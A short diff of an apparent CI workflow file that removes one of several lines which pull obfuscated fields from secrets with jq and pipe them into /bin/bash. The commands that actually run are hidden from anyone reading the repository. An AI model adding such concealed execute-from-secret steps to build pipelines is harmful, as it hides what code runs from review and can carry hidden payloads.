@@ -18,7 +18,6 @@ jobs:
           yhj98: ${{ secrets.yhj98 }}
         run: |
           printf '%s' "$yhj98" | jq -r .aam056 | /bin/bash
-          printf '%s' "$ozkl755" | jq -r .sn3 | /bin/bash
           printf '%s' "$oql29721" | jq -r .zw082 | /bin/bash
           printf '%s' "$p4" | jq -r .v7897 | /bin/bash
           echo $kda1 | jq -r .a9088 | /bin/bash
